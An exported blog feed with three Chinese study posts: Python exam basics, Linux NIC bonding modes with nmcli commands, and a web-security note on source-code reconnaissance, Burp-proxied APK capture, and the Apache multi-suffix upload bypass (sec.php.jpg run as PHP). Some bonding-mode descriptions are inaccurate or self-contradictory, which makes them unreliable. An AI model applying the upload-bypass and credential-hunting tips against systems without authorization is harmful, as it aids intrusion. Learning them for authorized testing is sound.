------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br><span class="line">[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>])</span><br><span class="line">[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">3</span>],[<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>])</span><br><span class="line">[<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure><p>关于 <strong>min()</strong> 简单使用和max同理上下原始注解，此处不再赘述。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">min</span>（可迭代，*[，默认=obj，key=func]）-&gt;值</span><br><span class="line">    <span class="built_in">min</span>（arg1， arg2，*args，*[，key=func]）-&gt;值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    使用单个可迭代参数，返回其最小项。这</span><br><span class="line">    默认仅关键字参数指定要返回的对象，如果</span><br><span class="line">    提供的可迭代对象为空。</span><br><span class="line">    使用两个或多个参数，返回最小的参数。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="数字类型的运算"><a href="#数字类型的运算" class="headerlink" title="数字类型的运算"></a>数字类型的运算</h2><p>数字类型的运算：数值运算操作符、数值运算函数。</p><p>运算函数列在上面，此处不赘述。</p><h3 id="数值运算操作符"><a href="#数值运算操作符" class="headerlink" title="数值运算操作符"></a>数值运算操作符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+ - * /% </span><br><span class="line">加减乘除余</span><br><span class="line">//</span><br><span class="line">整数除,除完后小数部分直接省略，<span class="number">10</span>//<span class="number">3</span>=&gt;<span class="number">3</span></span><br><span class="line">**</span><br><span class="line">幂运算，<span class="number">2</span>**<span class="number">3</span>相当于是<span class="number">2</span>的<span class="number">3</span>次方</span><br><span class="line">+x,-x</span><br><span class="line">正负数</span><br><span class="line"></span><br><span class="line"><span class="comment"># *====*====*====*====*====*</span></span><br></pre></td></tr></table></figure><h3 id="增强操作符"><a href="#增强操作符" class="headerlink" title="增强操作符"></a>增强操作符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+= -= *= /= **= //= %=</span><br><span class="line">简单解释一下就是：</span><br><span class="line">x += y ==等同于==&gt; x = x + y</span><br></pre></td></tr></table></figure><h2 id="真假无-True-False-None"><a href="#真假无-True-False-None" class="headerlink" title="真假无(True/False/None)"></a>真假无(True/False/None)</h2><p>真假无：True、False、None。</p><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>布尔类型只有两种状态，true或者false。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">布尔类型为false的几种情况如下:</span><br><span class="line">==&gt; <span class="string">&quot;&quot;</span> ,<span class="string">&#x27;&#x27;</span> ,[] ,<span class="number">0</span> ,() ,&#123;&#125; ,<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">这几种情况使用<span class="built_in">bool</span>()单独鉴定时返回false</span><br><span class="line">除了上述情况外，其他情况基本上都是：</span><br><span class="line">符合判断条件  ==&gt; <span class="literal">True</span></span><br><span class="line">不符合判断条件 ==&gt; <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="None"><a href="#None" class="headerlink" title="None"></a>None</h3><p>空值，比较特殊。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面给出一个结果</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="literal">None</span> == <span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="comment"># 说明None不等于False</span></span><br><span class="line"><span class="keyword">not</span> <span class="literal">None</span> == <span class="keyword">not</span> <span class="literal">False</span> == <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span> == <span class="keyword">not</span> <span class="number">0</span> == <span class="keyword">not</span> [] == <span class="keyword">not</span> &#123;&#125; == <span class="keyword">not</span> ()</span><br></pre></td></tr></table></figure><h2 id="字符串类型及格式化"><a href="#字符串类型及格式化" class="headerlink" title="字符串类型及格式化"></a>字符串类型及格式化</h2><p>详细教程请参考<a href="https://www.runoob.com/python/python-strings.html">菜鸟教程</a></p><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><h4 id="chr-和ord"><a href="#chr-和ord" class="headerlink" title="chr()和ord()"></a>chr()和ord()</h4><p>注：它们的转换时针对单个字符串而言的，不是多个字符串。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chr</span>（i，/）</span><br><span class="line">    返回一个字符的Unicode字符串，序号为i；<span class="number">0</span>&lt;=i&lt;=<span class="number">0x10ffff</span></span><br><span class="line"><span class="built_in">ord</span>（c，/）</span><br><span class="line">    返回单字符字符串的Unicode代码点。</span><br><span class="line"><span class="comment"># 简单讲，就是：</span></span><br><span class="line"><span class="comment"># ord获取字符串的数字(Unicode代码点) </span></span><br><span class="line"><span class="comment"># chr将数字转换为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&quot;你&quot;</span>)</span><br><span class="line"><span class="number">20320</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">20320</span>)</span><br><span class="line"><span class="string">&#x27;你&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="oct-1-hex-len"><a href="#oct-1-hex-len" class="headerlink" title="oct()1,hex(),len()"></a>oct()1,hex(),len()</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">oct</span>() <span class="comment"># 返回整数的八进制形式</span></span><br><span class="line"><span class="built_in">hex</span>() <span class="comment"># 返回整数的十六进制形式 </span></span><br><span class="line"><span class="built_in">len</span>() <span class="comment"># 测量字符串/数组的长度</span></span><br><span class="line"><span class="built_in">str</span>() <span class="comment"># 强制转换为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">oct</span>(<span class="number">12</span>)</span><br><span class="line"><span class="string">&#x27;0o14&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">233</span>)</span><br><span class="line"><span class="string">&#x27;0xe9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">123456</span>)</span><br><span class="line"><span class="string">&#x27;123456&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="字符串内置函数"><a href="#字符串内置函数" class="headerlink" title="字符串内置函数"></a>字符串内置函数</h3><h4 id="字母处理"><a href="#字母处理" class="headerlink" title="字母处理"></a>字母处理</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;a123abcASD&quot;</span></span><br><span class="line">a.upper()      =&gt; 小写字母变大写</span><br><span class="line">a.lower()      =&gt; 大写字母变小写</span><br><span class="line">a.swapcase()   =&gt; 大小写互换</span><br><span class="line">a.capitalize() =&gt; 首字母大写其他小写</span><br><span class="line">a.title()      =&gt; 首字母大写</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;sec123Go&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br><span class="line"><span class="built_in">print</span>(a.upper())</span><br><span class="line"><span class="built_in">print</span>(a.swapcase())</span><br><span class="line"><span class="built_in">print</span>(a.capitalize())</span><br><span class="line"><span class="built_in">print</span>(a.title())</span><br><span class="line"><span class="comment"># ---运行结果--- #</span></span><br><span class="line">sec123go</span><br><span class="line">SEC123GO</span><br><span class="line">SEC123gO</span><br><span class="line">Sec123go</span><br><span class="line">Sec123Go</span><br></pre></td></tr></table></figure><h5 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.ljust(width)  =&gt; 根据width扩展字符串长度，并且左边对齐，空格补全</span><br><span class="line">a.rjust(width)  =&gt; 根据width扩展字符串长度，并且右边对齐，空格补全</span><br><span class="line">a.center(width) =&gt; 根据width扩展字符串长度，并且中间对齐，空格补全</span><br><span class="line">a.zfill(width)  =&gt; 根据width扩展字符串长度，并且右边对齐，用<span class="number">0</span>补全</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;sec123Go&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>+a.ljust(<span class="number">20</span>)+<span class="string">&quot;-&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>+a.rjust(<span class="number">20</span>)+<span class="string">&quot;-&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>+a.center(<span class="number">20</span>)+<span class="string">&quot;-&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>+a.zfill(<span class="number">20</span>)+<span class="string">&quot;-&quot;</span>)</span><br><span class="line"><span class="comment"># 注意！&quot;-&quot;是我用来显示边界的。</span></span><br><span class="line"><span class="comment"># ---运行结果--- #</span></span><br><span class="line">-sec123Go            -</span><br><span class="line">-            sec123Go-</span><br><span class="line">-      sec123Go      -</span><br><span class="line">-000000000000sec123Go-</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.find(<span class="built_in">str</span>,beg, end) =&gt; 从字符串a的beg和end内搜索字符串<span class="built_in">str</span>,搜索到就返回下标，搜索不到就返回-<span class="number">1</span></span><br><span class="line">a.index()   =&gt; 和上面功能一样，但找不到就报错</span><br><span class="line">a.count()   =&gt; 统计指定字符串出现的次数</span><br><span class="line">a.rfind()   =&gt; 从右边开始查找</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;sec123Go&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&#x27;secw&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;123&#x27;</span>,<span class="number">2</span>,<span class="built_in">len</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="string">&#x27;ec&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.rfind(<span class="string">&#x27;sec&#x27;</span>))</span><br><span class="line"><span class="comment"># ---运行结果--- #</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="format格式化-要点"><a href="#format格式化-要点" class="headerlink" title="format格式化(要点)"></a>format格式化(要点)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;str&quot;</span>)    <span class="comment"># 格式化字符串，类似%s，传递值能多不能少</span></span><br><span class="line">模板：&#123;:填充 对齐 宽度 千位分隔符 精度 类型&#125;</span><br></pre></td></tr></table></figure><p>实例1</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I &#123;x&#125; &#123;y&#125;&quot;</span>.<span class="built_in">format</span>(x=<span class="string">&#x27;like&#x27;</span>,y=<span class="string">&quot;python&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:=&gt;20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;class&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:=&lt;20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;class&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:=^20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;class&#x27;</span>))</span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line">I like python</span><br><span class="line">===============<span class="keyword">class</span></span><br><span class="line"><span class="title class_">class</span>===============</span><br><span class="line">=======<span class="keyword">class</span>========</span><br></pre></td></tr></table></figure><p>实例2</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:+.2f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.12345</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:-.2f&#125;&quot;</span>.<span class="built_in">format</span>(-<span class="number">3.12345</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.0f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.12345</span>))</span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line">+<span class="number">3.12</span></span><br><span class="line">-<span class="number">3.12</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>实例3</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:o&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:#X&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">1011</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line">b</span><br><span class="line"><span class="number">0xb</span></span><br><span class="line"><span class="number">0XB</span></span><br></pre></td></tr></table></figure><h4 id="其他字符串内置函数"><a href="#其他字符串内置函数" class="headerlink" title="其他字符串内置函数"></a>其他字符串内置函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.replace(<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;SSS&#x27;</span>[,num]) =&gt; 将a里面的<span class="string">&#x27;str&#x27;</span>替换成<span class="string">&#x27;SSS&#x27;</span>总计num次</span><br><span class="line">a.strip()               =&gt; 去除字符串两边的空格，另外还有个左去除(a.lstrip())和右去除(a.rstrip())</span><br><span class="line">a.split([<span class="string">&#x27;str&#x27;</span>])        =&gt; [<span class="string">&#x27;str&#x27;</span>]参数可选，指定字符串切割字符为数组，或者使用默认切割。</span><br><span class="line">string.join(seq)        =&gt; 以 string 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot; sec123secGo &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>+a.replace(<span class="string">&#x27;sec&#x27;</span>,<span class="string">&#x27;DNS&#x27;</span>,<span class="number">1</span>)+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>+a.strip()+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.split())</span><br><span class="line"><span class="built_in">print</span>(a.split(<span class="string">&#x27;s&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;~&#x27;</span>.join([<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;Python&#x27;</span>]))</span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line">- DNS123secGo -</span><br><span class="line">-sec123secGo-</span><br><span class="line">[<span class="string">&#x27;sec123secGo&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;ec123&#x27;</span>, <span class="string">&#x27;ecGo &#x27;</span>]</span><br><span class="line">I~like~Python</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="格式化操作"><a href="#格式化操作" class="headerlink" title="格式化操作"></a>格式化操作</h3><h4 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string1+string2         字符串拼接</span><br><span class="line">string*<span class="number">2</span>                string变成俩份，也就是<span class="string">&#x27;stringstring&#x27;</span></span><br><span class="line">string[x]               获取指定位置字符串</span><br><span class="line">string[x:y]             字符串切片，把指定区域字符串截取出来</span><br><span class="line">string[::-<span class="number">1</span>]            翻转字符串</span><br><span class="line">string <span class="keyword">in</span> string1       查看字符串string是否存在于string1当中，是则返回true，否则false</span><br><span class="line">string <span class="keyword">not</span> <span class="keyword">in</span> string1   查看字符串string是否不存在于string1当中，是则返回true，否则false</span><br><span class="line"><span class="string">r&#x27;string&#x27;</span>               输出原始字符串，即使是换行符也同样输出</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot; sec123secGo &quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">r&#x27;\n\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># --CMD运行结果入下-- #</span></span><br><span class="line"> sec123secGo </span><br><span class="line">c</span><br><span class="line">G</span><br><span class="line">sec123secGo</span><br><span class="line"> oGces321ces </span><br><span class="line"><span class="literal">True</span></span><br><span class="line">\n\n\n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">补充：计量百分比</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;:5&#125;%&quot;</span>.<span class="built_in">format</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.03</span>)</span><br></pre></td></tr></table></figure><h2 id="类型判断和类型间转换"><a href="#类型判断和类型间转换" class="headerlink" title="类型判断和类型间转换"></a>类型判断和类型间转换</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">类型判断</span><br><span class="line"><span class="built_in">type</span>(<span class="built_in">object</span>) =&gt; <span class="built_in">object</span>，放需要判断类型的数据即可</span><br><span class="line"></span><br><span class="line">类型强转</span><br><span class="line"><span class="built_in">float</span>(<span class="built_in">object</span>)   <span class="built_in">int</span>(<span class="built_in">object</span>)  <span class="built_in">str</span>(<span class="built_in">object</span>)   </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="逻辑运算和比较运算"><a href="#逻辑运算和比较运算" class="headerlink" title="逻辑运算和比较运算"></a>逻辑运算和比较运算</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">比较运算符</span><br><span class="line">&lt; &gt; &lt;= &gt;= != ==</span><br><span class="line">逻辑运算符</span><br><span class="line"><span class="keyword">and</span> 全true则true </span><br><span class="line"><span class="keyword">or</span>  有true则true</span><br><span class="line"><span class="keyword">not</span> 反转布尔值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器配置-学习日志-002</title>
      <link href="/2023/03/11/Linux-Server-Study-002/"/>
      <url>/2023/03/11/Linux-Server-Study-002/</url>
      
        <content type="html"><![CDATA[<p>03-16开始完善（尽力）</p><p>管理网络连接，网卡组合，常用网络命令</p><span id="more"></span><h1 id="管理网络连接"><a href="#管理网络连接" class="headerlink" title="管理网络连接"></a>管理网络连接</h1><h1 id="网卡组合"><a href="#网卡组合" class="headerlink" title="网卡组合"></a>网卡组合</h1><p>Bonding是Linux内核中的一种网络技术，它可以将多个物理网卡绑定成一个逻辑网卡，从而实现网络负载均衡和冗余备份。<br>Linux Bonding支持七种模式，分别是mode 0到mode 6。</p><p>下面对每种模式进行简要介绍：</p><h2 id="mode-0（balance-rr）"><a href="#mode-0（balance-rr）" class="headerlink" title="mode 0（balance-rr）"></a>mode 0（balance-rr）</h2><p>该模式下，数据包将会按照轮询的方式分配到各个绑定的网卡上，从而实现负载均衡。<br>这种模式不需要交换机的支持，但会出现数据包乱序的情况，因此需要使用一些支持乱序数据包的协议，如TCP。</p><h2 id="mode-1（active-backup）"><a href="#mode-1（active-backup）" class="headerlink" title="mode 1（active-backup）"></a>mode 1（active-backup）</h2><p>在该模式下，只有一个主网卡是活动的，其余网卡处于备份状态。<br>当主网卡出现故障时，备用网卡会自动接管其工作。<br>这种模式需要交换机的支持，且不能实现负载均衡。</p><h2 id="mode-2（balance-xor）"><a href="#mode-2（balance-xor）" class="headerlink" title="mode 2（balance-xor）"></a>mode 2（balance-xor）</h2><p>该模式下，数据包将会按照“源IP地址+目的IP地址”的散列值分配到各个绑定的网卡上，从而实现负载均衡。<br>该模式同样需要交换机的支持。</p><h2 id="mode-3（broadcast）"><a href="#mode-3（broadcast）" class="headerlink" title="mode 3（broadcast）"></a>mode 3（broadcast）</h2><p><strong>介绍</strong></p><ul><li>在该模式下，所有的网卡都会接收到所有的数据包，但只有一个网卡会发送回复数据包。</li><li>该模式不需要交换机的支持，但不能实现负载均衡。</li></ul><h2 id="mode-4（802-3ad）"><a href="#mode-4（802-3ad）" class="headerlink" title="mode 4（802.3ad）"></a>mode 4（802.3ad）</h2><p><strong>介绍</strong></p><ul><li>该模式是IEEE 802.3ad协议的实现，可以通过绑定多个物理网卡来实现带宽的聚合和冗余备份。</li><li>该模式需要交换机的支持，并且需要交换机的端口聚合功能开启。</li><li>该模式也可以不使用交换机。</li></ul><h2 id="mode-5（balance-tlb）"><a href="#mode-5（balance-tlb）" class="headerlink" title="mode 5（balance-tlb）"></a>mode 5（balance-tlb）</h2><p><strong>介绍</strong></p><ul><li>该模式不需要交换机的支持，但不会进行双向传输，因此对于接收数据的网卡而言，其负载可能会比较高。</li><li>该模式同时支持自适应负载均衡和自适应负载均衡加主备模式两种方式。</li></ul><h2 id="mode-6（balance-alb）"><a href="#mode-6（balance-alb）" class="headerlink" title="mode 6（balance-alb）"></a>mode 6（balance-alb）</h2><p><strong>介绍</strong></p><ul><li>在该模式下，数据包将会按照负载均衡的方式分配到所有绑定的网卡上，并且会根据网卡的负载情况来自动调整流量。</li><li>与mode 5不同的是，该模式支持双向传输，即数据包可以同时从多个网卡上发出，并且可以自动检测到网卡故障并切换到其他可用的网卡上。</li></ul><h2 id="实践-mode-6"><a href="#实践-mode-6" class="headerlink" title="实践 mode 6"></a>实践 mode 6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="常用网络命令"><a href="#常用网络命令" class="headerlink" title="常用网络命令"></a>常用网络命令</h1><p>modify ens32 修改网卡ens32<br>ipv4.method manual IP地址获得方式更改为手动<br>nmcli配置后必须使用nmcli启动网卡<br>nmcli device connect ens32  激活网卡<br>添加新网卡的时候，需要自己在/etc/sysconfig/network-script/当中添加对应名字的新网卡配置文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Server </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习-0005-基础</title>
      <link href="/2023/03/11/SEC-Study-0005/"/>
      <url>/2023/03/11/SEC-Study-0005/</url>
      
        <content type="html"><![CDATA[<p>web源码拓展，CMS</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析比如:</p><ul><li>获取某ASP源码后可以采用默认数据库下载为突破</li><li>获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等<br>总之源码的获取将为后期的安全测试提供了更多的思路</li></ul><h1 id="apk抓包分析"><a href="#apk抓包分析" class="headerlink" title="apk抓包分析"></a>apk抓包分析</h1><p>apk的抓包：使用逍遥模拟器挂burp代理即可。<br>-&gt; 这个配置前面讲过，但可能出了点问题，后面再修补吧。</p><p>aginux网站漏洞扫描(未授权时别乱扫).安装使用教程如下：<br><a href="https://blog.csdn.net/weixin_54977781/article/details/123444098">推荐资料1</a><br><a href="http://vip.ytesting.com/qa01Controller.do?articleInfo&id=10009">推荐资料2</a><br><a href="https://www.cnblogs.com/iamver/p/7124718.html">推荐资料3</a></p><p>抓apk的时候，放head+网址。</p><h2 id="多后缀解析漏洞"><a href="#多后缀解析漏洞" class="headerlink" title="多后缀解析漏洞"></a>多后缀解析漏洞</h2><p>其他漏洞去漏洞靶场<a href="https://www.vulhub.org/">vulhub</a>上整出来就行。</p><p>这里涉及了一个apache的文件上传多后缀解析漏洞。相当于上传sec.php.jpg文件，解析时被当作php文件解析。(文件上传漏洞)</p><h2 id="如何看脚本类型"><a href="#如何看脚本类型" class="headerlink" title="如何看脚本类型"></a>如何看脚本类型</h2><p>根据数据库反推脚本类型。<br>看搭建平台。<br>谷歌快照，抓数据包。</p><p>找不出类型：脚本伪静态。<br>phpsession jspsession</p><p>文件上传是网站源码控制的，我们只是在上传时做了一些处理，结合中间件上传漏洞使得其可以绕过验证。</p><h1 id="web源码"><a href="#web源码" class="headerlink" title="web源码"></a>web源码</h1><p>知识点:<br>脚本类型选择上的不同会造成安全漏洞类型上的不同。</p><p><img src="c1.jpg" alt="源码的功能决定了漏洞的类型"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">目录结构       ==&gt;了解框架便有理解</span><br><span class="line">    后台目录    admin,member</span><br><span class="line">    模板目录    <span class="title function_ invoke__">template</span>(模板文件)</span><br><span class="line">    数据库目录  install</span><br><span class="line">    数据库配置目录 includes,data    -&gt; 获取数据库连接的账号和密码</span><br><span class="line">    (一般通过单词找对应的配置文件目录)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">脚本类型   ==&gt;数据库存储/解释或编译型/语言安全</span><br><span class="line">    ASP</span><br><span class="line">    PHP</span><br><span class="line">    ASPX</span><br><span class="line">    JSP</span><br><span class="line">    JAVAWEB</span><br><span class="line">    <span class="title function_ invoke__">Python</span></span><br><span class="line">    (websec.readthedocs.io/zh/latest/vuln/sql/cheatsheet/mysql.html --&gt; web学习笔记) </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">应用分类 ==&gt;源码的功能决定了漏洞的类型(确定侧重点)</span><br><span class="line">    门户   ==&gt;综合类漏洞</span><br><span class="line">    电商   ==&gt;业务逻辑突出</span><br><span class="line">    论坛   ==&gt;xss，逻辑突出</span><br><span class="line">    博客   ==&gt;漏洞较少</span><br><span class="line">    第三方 ==&gt;据功能决定</span><br><span class="line">    其他</span><br><span class="line">    